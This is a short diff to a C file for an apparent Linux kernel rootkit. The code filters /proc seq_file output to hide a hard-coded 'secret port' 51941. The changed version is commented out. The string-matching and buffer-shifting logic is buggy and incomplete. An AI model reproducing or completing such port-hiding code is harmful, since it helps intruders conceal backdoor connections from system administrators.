@@ -1,18 +1,13 @@
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/seq_file.h>
-#define SECREAT_PORT "51941"
-static const struct seq_operations seq_ops = {
-        .show = rk_show
-};
-int rk_show(struct seq_file *seq_f, void *v)
+#include "seq.h"
+//#include "hide_proc_net.h"
+/*int rk_show(struct seq_file *seq_f, void *v)
 {
+   // int ret = origin_show(seq_f, v);
     char* ptr = strstr(seq_f->buf, SECREAT_PORT);
-    if (!ptr)
+    if (ptr == NULL || ptr == seq_f->buf)
         return 0;
     seq_f->buf = ptr;
-    seq_f->count -= sizeof(ptr);
-    //real_show_seq(seq_f, v);
-    //hundle regular
-}   
+    seq_f->size -= seq_f->size-sizeof(ptr);
+    return 1;
+    
+}*/   
